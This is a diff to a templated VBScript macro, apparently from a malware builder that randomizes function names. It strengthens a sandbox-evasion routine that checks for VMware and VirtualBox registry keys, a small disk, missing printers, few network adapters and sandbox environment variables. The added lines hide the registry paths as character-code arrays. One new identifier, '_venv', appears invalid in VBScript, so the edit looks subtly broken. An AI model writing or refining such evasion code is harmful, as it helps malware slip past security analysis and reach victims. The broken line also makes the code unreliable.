@@ -52,16 +52,16 @@ Function {{ v.fn_sandbox }}()
             If pn = badList(j) Then {{ v.fn_sandbox }} = True: Exit Function
         Next
     Next
-    ' VM registry checks
+    ' VM registry checks (paths obfuscated via fn_build_str)
     On Error Resume Next
     Dim sh: Set sh = CreateObject("WScript.Shell")
-    sh.RegRead "HKLM\SOFTWARE\VMware, Inc.\VMware Tools\InstallPath"
+    sh.RegRead {{ v.fn_build_str }}(Array(72,75,76,77,92,83,79,70,84,87,65,82,69,92,86,77,119,97,114,101,44,32,73,110,99,46,92,86,77,119,97,114,101,32,84,111,111,108,115,92,73,110,115,116,97,108,108,80,97,116,104))
     If Err.Number = 0 Then {{ v.fn_sandbox }} = True: Exit Function
     Err.Clear
-    sh.RegRead "HKLM\SOFTWARE\Oracle\VirtualBox Guest Additions\Version"
+    sh.RegRead {{ v.fn_build_str }}(Array(72,75,76,77,92,83,79,70,84,87,65,82,69,92,79,114,97,99,108,101,92,86,105,114,116,117,97,108,66,111,120,32,71,117,101,115,116,32,65,100,100,105,116,105,111,110,115,92,86,101,114,115,105,111,110))
     If Err.Number = 0 Then {{ v.fn_sandbox }} = True: Exit Function
     Err.Clear
-    Dim fso2 As Object, drv2 As Object
+    Dim fso2, drv2
     Set fso2 = CreateObject("Scripting.FileSystemObject")
     On Error Resume Next
     Set drv2 = fso2.GetDrive("C:")
@@ -71,31 +71,35 @@ Function {{ v.fn_sandbox }}()
     On Error GoTo 0
     Set fso2 = Nothing
     On Error Resume Next
-    Dim wmiPrt As Object, printers As Object, prtCount As Long
+    Dim wmiPrt, printers, prtCount
     Set wmiPrt = GetObject("winmgmts:")
     If Err.Number = 0 Then
         Set printers = wmiPrt.ExecQuery("SELECT Name FROM Win32_Printer")
         prtCount = 0
-        Dim oPrt As Object
+        Dim oPrt
         For Each oPrt In printers: prtCount = prtCount + 1: Next
         If prtCount = 0 Then {{ v.fn_sandbox }} = True: Set wmiPrt = Nothing: Exit Function
     End If
     On Error GoTo 0
     Set wmiPrt = Nothing
     On Error Resume Next
-    Dim wmiNa As Object, naQ As Object, naCnt As Long
+    Dim wmiNa, naQ, naCnt
     Set wmiNa = GetObject("winmgmts:")
     If Err.Number = 0 Then
         Set naQ = wmiNa.ExecQuery("SELECT MACAddress FROM Win32_NetworkAdapter WHERE MACAddress IS NOT NULL")
         naCnt = 0
-        Dim oNa As Object
+        Dim oNa
         For Each oNa In naQ: naCnt = naCnt + 1: Next
         If naCnt < 2 Then {{ v.fn_sandbox }} = True: Set wmiNa = Nothing: Exit Function
     End If
     On Error GoTo 0
     Set wmiNa = Nothing
-    If Environ("VBOX_VERSION") <> "" Then {{ v.fn_sandbox }} = True: Exit Function
-    If Environ("SANDBOXIE_HOME") <> "" Then {{ v.fn_sandbox }} = True: Exit Function
+    On Error Resume Next
+    Dim _venv: Set _venv = CreateObject("WScript.Shell").Environment("Process")
+    If _venv("VBOX_VERSION") <> "" Then {{ v.fn_sandbox }} = True: Set _venv = Nothing: Exit Function
+    If _venv("SANDBOXIE_HOME") <> "" Then {{ v.fn_sandbox }} = True: Set _venv = Nothing: Exit Function
+    Set _venv = Nothing
+    On Error GoTo 0
 End Function
 
 Sub {{ v.sub_run }}()
